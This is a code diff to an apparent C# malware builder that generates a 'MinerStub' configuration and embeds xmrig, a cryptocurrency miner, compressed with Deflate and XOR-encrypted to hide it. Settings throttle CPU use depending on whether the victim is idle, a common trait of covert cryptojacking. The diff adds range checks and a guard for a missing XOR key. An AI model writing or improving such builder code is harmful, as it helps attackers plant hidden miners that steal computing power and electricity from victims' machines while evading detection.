@@ -1857,10 +1857,15 @@ internal static class Config
     private string GenerateMinerConfigCs()
     {
         static string Esc(string s) => s.Replace("\\", "\\\\").Replace("\"", "\\\"");
-        int.TryParse(BldMnrCpuIdle.Text,       out int cpuIdle);       if (cpuIdle < 0 || cpuIdle > 100) cpuIdle = 75;
-        int.TryParse(BldMnrCpuActive.Text,     out int cpuActive);
-        int.TryParse(BldMnrIdleSec.Text,       out int idleSec);       if (idleSec < 5) idleSec = 30;
-        string xorKeyB64 = _bldXorKey != null ? Convert.ToBase64String(_bldXorKey) : "";
+        int.TryParse(BldMnrCpuIdle.Text,       out int cpuIdle);   if (cpuIdle   < 0 || cpuIdle   > 100) cpuIdle   = 75;
+        int.TryParse(BldMnrCpuActive.Text,     out int cpuActive); if (cpuActive < 0 || cpuActive > 100) cpuActive = 50;
+        int.TryParse(BldMnrIdleSec.Text,       out int idleSec);   if (idleSec  < 5)                    idleSec   = 30;
+        if (_bldXorKey == null)
+        {
+            Log("[!] Miner: XOR key not initialized — run 'Load xmrig' first.");
+            return "";
+        }
+        string xorKeyB64 = Convert.ToBase64String(_bldXorKey);
 
         return $@"namespace MinerStub;
 
@@ -1925,7 +1930,9 @@ internal static class MinerConfig
             System.Security.Cryptography.RandomNumberGenerator.Fill(_bldXorKey);
 
             var cfgPath = Path.Combine(minerDir, "MinerConfig.cs");
-            await File.WriteAllTextAsync(cfgPath, GenerateMinerConfigCs());
+            var minerCfg = GenerateMinerConfigCs();
+            if (string.IsNullOrEmpty(minerCfg)) return; // XOR key not ready (logged in GenerateMinerConfigCs)
+            await File.WriteAllTextAsync(cfgPath, minerCfg);
 
             // Deflate-compress then XOR-encrypt xmrig before embedding
             var xmrigBinDst = Path.Combine(minerDir, "xmrig.bin");
